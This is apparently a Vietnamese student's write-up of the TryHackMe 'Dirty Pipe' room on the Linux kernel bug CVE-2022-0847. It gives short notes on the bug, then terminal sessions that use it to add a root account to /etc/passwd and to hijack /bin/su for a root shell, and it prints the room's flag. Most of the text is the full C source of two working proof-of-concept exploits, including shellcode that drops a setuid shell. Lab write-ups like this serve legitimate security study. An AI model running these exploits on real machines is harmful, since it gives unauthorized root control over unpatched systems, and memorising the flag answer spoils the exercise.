- link bt: https://tryhackme.com/room/dirtypipe<br>

*. task 1<br>
- lỗ hổng Dirty Pipe: cho phép kẻ tấn công ghi đè lên các tệp trên hđh -> can leo thang đặc quyền
- mọi thiết bị chạy phiên bản nhân linux đều dễ bị tấn công (kể cả điện thoại android)<br>

*. task 2<br>
- đơn vị bộ nhớ nhỏ nhất do CPU điều khiển: page (4Kib). nó đc xài khi đọc và ghi các tập tin từ đĩa
- kí tự: '|' cho phép truyền dữ liệu giữa 2 quy trình, nó có 2 đầu (đọc - viết)
- ghép 1 page vào pype r ghi data của c.ta vào pype -> can ghi đè lên nội dung của pype
- cờ: PIPE_BUF_FLAG_CAN_MERGE -> cho kernel bt rằng page can đc cập nhật mà ko cần phải ghi lại dữ liệu<br>

. các bước tán công:<br>
- chọn 1 tệp mục tiêu mà c.ta có quyền đọc
- c.bị 1 pype theo cách đặc biệt và thêm cờ PIPE_BUF_FLAG_CAN_MERGE
- xài splice() để tạo điểm ống tại phần mong muốn của tệp đích
- -> can ghi đè lên tệp của hệ thống nhờ cờ PIPE_BUF_FLAG_CAN_MERGE<br>

*. task 3<br>
- lựa chọn tệp: /etc/passswd
- các bước:<br>
```
┌──(root㉿kali)-[/home/kali]
└─# ssh tryhackme@10.10.196.174
The authenticity of host '10.10.196.174 (10.10.196.174)' can't be established.
ED25519 key fingerprint is SHA256:765oVwXuNlAyaWA6+syTdd5PYGRlEI1Q+YGRmf99U6c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.196.174' (ED25519) to the list of known hosts.
tryhackme@10.10.196.174's password: 


         _____           _   _            _    __  __      
        |_   _| __ _   _| | | | __ _  ___| | _|  \/  | ___ 
          | || '__| | | | |_| |/ _` |/ __| |/ / |\/| |/ _ \
          | || |  | |_| |  _  | (_| | (__|   <| |  | |  __/
          |_||_|   \__, |_| |_|\__,_|\___|_|\_\_|  |_|\___|
                   |___/                                   



tryhackme@dirty-pipe:~$ openssl passwd -6 --salt THM "chaumoon"
$6$THM$hCu.aP/tEth5hL7gmiMQlHw1lwaoWo0/Rly/gL7gL8sh/Ikn9oBbUvEs9iAwHwLpUin6S9hNqDA/6Jx9LALVT.
tryhackme@dirty-pipe:~$ grep -b "games" /etc/passwd
189:games:x:5:60:games:/usr/games:/usr/sbin/nologin
tryhackme@dirty-pipe:~$ cd ~/Exploit/PoC
tryhackme@dirty-pipe:~/Exploit/PoC$ gcc poc.c -o exploit
tryhackme@dirty-pipe:~/Exploit/PoC$ ls
exploit  poc.c
tryhackme@dirty-pipe:~/Exploit/PoC$ ./exploit /etc/passwd 189 'chau:$6$THM$hCu.aP/tEth5hL7gmiMQlHw1lwaoWo0/Rly/gL7gL8sh/Ikn9oBbUvEs9iAwHwLpUin6S9hNqDA/6Jx9LALVT.:0:0::/root:/bin/bash
> > '
It worked!
tryhackme@dirty-pipe:~/Exploit/PoC$ su root
Password: 
su: Authentication failure
tryhackme@dirty-pipe:~/Exploit/PoC$ whoami
tryhackme
tryhackme@dirty-pipe:~/Exploit/PoC$ su chau
Password: 
root@dirty-pipe:/home/tryhackme/Exploit/PoC# whoami
root
root@dirty-pipe:/home/tryhackme/Exploit/PoC# cat /root/flag.txt
THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}
root@dirty-pipe:/home/tryhackme/Exploit/PoC# 
```

- nội dung tệp poc.c:<br>
```
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
        if (pipe(p)) abort();

        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
        static char buffer[4096];

        /* fill the pipe completely; each pipe_buffer will now have
           the PIPE_BUF_FLAG_CAN_MERGE flag */
        for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                write(p[1], buffer, n);
                r -= n;
        }

        /* drain the pipe, freeing all pipe_buffer instances (but
           leaving the flags initialized) */
        for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                read(p[0], buffer, n);
                r -= n;
        }

        /* the pipe is now empty, and if somebody adds a new
           pipe_buffer without initializing its "flags", the buffer
           will be mergeable */
}

int main(int argc, char **argv)
{
        if (argc != 4) {
                fprintf(stderr, "Usage: %s TARGETFILE OFFSET DATA\n", argv[0]);
                return EXIT_FAILURE;
        }

        /* dumb command-line argument parser */
        const char *const path = argv[1];
        loff_t offset = strtoul(argv[2], NULL, 0);
        const char *const data = argv[3];
        const size_t data_size = strlen(data);

        if (offset % PAGE_SIZE == 0) {
                fprintf(stderr, "Sorry, cannot start writing at a page boundary\n");
                return EXIT_FAILURE;
        }

        const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
        const loff_t end_offset = offset + (loff_t)data_size;
        if (end_offset > next_page) {
                fprintf(stderr, "Sorry, cannot write across a page boundary\n");
                return EXIT_FAILURE;
        }

        /* open the input file and validate the specified offset */
        const int fd = open(path, O_RDONLY); // yes, read-only! :-)
        if (fd < 0) {
                perror("open failed");
                return EXIT_FAILURE;
        }

        struct stat st;
        if (fstat(fd, &st)) {
                perror("stat failed");
                return EXIT_FAILURE;
        }

        if (offset > st.st_size) {
                fprintf(stderr, "Offset is not inside the file\n");
                return EXIT_FAILURE;
        }

        if (end_offset > st.st_size) {
                fprintf(stderr, "Sorry, cannot enlarge the file\n");
                return EXIT_FAILURE;
        }

        /* create the pipe with all flags initialized with
           PIPE_BUF_FLAG_CAN_MERGE */
        int p[2];
        prepare_pipe(p);

        /* splice one byte from before the specified offset into the
           pipe; this will add a reference to the page cache, but
           since copy_page_to_iter_pipe() does not initialize the
           "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
        --offset;
        ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
        if (nbytes < 0) {
                perror("splice failed");
                return EXIT_FAILURE;
        }
        if (nbytes == 0) {
                fprintf(stderr, "short splice\n");
                return EXIT_FAILURE;
        }

        /* the following write will not create a new pipe_buffer, but
           will instead write into the page cache, because of the
           PIPE_BUF_FLAG_CAN_MERGE flag */
        nbytes = write(p[1], data, data_size);
        if (nbytes < 0) {
                perror("write failed");
                return EXIT_FAILURE;
        }
        if ((size_t)nbytes < data_size) {
                fprintf(stderr, "short write\n");
                return EXIT_FAILURE;
        }

        printf("It worked!\n");
        return EXIT_SUCCESS;
}
```

1. What is the flag found in the /root/flag.txt file?<br>
As: THM{MmU4Zjg0NDdjNjFiZWM5ZjUyZGEyMzlm}<br>

*. task 4<br>
- ghi đè lên tệp nhị phân SUID (ổn hơn /etc/passwd)
- các bước:<br>
```
tryhackme@dirty-pipe:~/Exploit/PoC$ cd /home/tryhackme/Exploit/Bl4sty/
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ gcc dirtypipez.c -o exploit
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ ls
dirtypipez.c  exploit
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ ./exploit /bin/su
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami
root
# 
```

- nội dung tệp: dirtypipez.c:<br>
```
tryhackme@dirty-pipe:~/Exploit/Bl4sty$ cat dirtypipez.c
//
// dirtypipez.c
//
// hacked up Dirty Pipe (CVE-2022-0847) PoC that hijacks a SUID binary to spawn
// a root shell. (and attempts to restore the damaged binary as well)
//
// Wow, Dirty CoW reloaded!
//
// -- blasty <peter@haxx.in> // 2022-03-07

/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

// small (linux x86_64) ELF file matroshka doll that does;
//   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
//   write(fd, elfcode, elfcode_len)
//   chmod("/tmp/sh", 04755)
//   close(fd);
//   exit(0);
//
// the dropped ELF simply does:
//   setuid(0);
//   setgid(0);
//   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
unsigned char elfcode[] = {
        /*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
        0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
        0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
        0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
        0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
        0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
        0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
        0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
        0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
        0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
        0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
        0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
        0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
        0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
        0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
};

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
        if (pipe(p)) abort();

        const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
        static char buffer[4096];

        /* fill the pipe completely; each pipe_buffer will now have
           the PIPE_BUF_FLAG_CAN_MERGE flag */
        for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                write(p[1], buffer, n);
                r -= n;
        }

        /* drain the pipe, freeing all pipe_buffer instances (but
           leaving the flags initialized) */
        for (unsigned r = pipe_size; r > 0;) {
                unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
                read(p[0], buffer, n);
                r -= n;
        }

        /* the pipe is now empty, and if somebody adds a new
           pipe_buffer without initializing its "flags", the buffer
           will be mergeable */
}

int hax(char *filename, long offset, uint8_t *data, size_t len) {
        /* open the input file and validate the specified offset */
        const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
        if (fd < 0) {
                perror("open failed");
                return -1;
        }

        struct stat st;
        if (fstat(fd, &st)) {
                perror("stat failed");
                return -1;
        }

        /* create the pipe with all flags initialized with
           PIPE_BUF_FLAG_CAN_MERGE */
        int p[2];
        prepare_pipe(p);

        /* splice one byte from before the specified offset into the
           pipe; this will add a reference to the page cache, but
           since copy_page_to_iter_pipe() does not initialize the
           "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
        --offset;
        ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
        if (nbytes < 0) {
                perror("splice failed");
                return -1;
        }
        if (nbytes == 0) {
                fprintf(stderr, "short splice\n");
                return -1;
        }

        /* the following write will not create a new pipe_buffer, but
           will instead write into the page cache, because of the
           PIPE_BUF_FLAG_CAN_MERGE flag */
        nbytes = write(p[1], data, len);
        if (nbytes < 0) {
                perror("write failed");
                return -1;
        }
        if ((size_t)nbytes < len) {
                fprintf(stderr, "short write\n");
                return -1;
        }

        close(fd);

        return 0;
}

int main(int argc, char **argv) {
        if (argc != 2) {
                fprintf(stderr, "Usage: %s SUID\n", argv[0]);
                return EXIT_FAILURE;
        }

        char *path = argv[1];
        uint8_t *data = elfcode;

        int fd = open(path, O_RDONLY);
        uint8_t *orig_bytes = malloc(sizeof(elfcode));
        lseek(fd, 1, SEEK_SET);
        read(fd, orig_bytes, sizeof(elfcode));
        close(fd);

        printf("[+] hijacking suid binary..\n");
        if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {
                printf("[~] failed\n");
                return EXIT_FAILURE;
        }

        printf("[+] dropping suid shell..\n");
        system(path);

        printf("[+] restoring suid binary..\n");
        if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
                printf("[~] failed\n");
                return EXIT_FAILURE;
        }

        printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\n");
        system("/tmp/sh");

        return EXIT_SUCCESS;
}
```
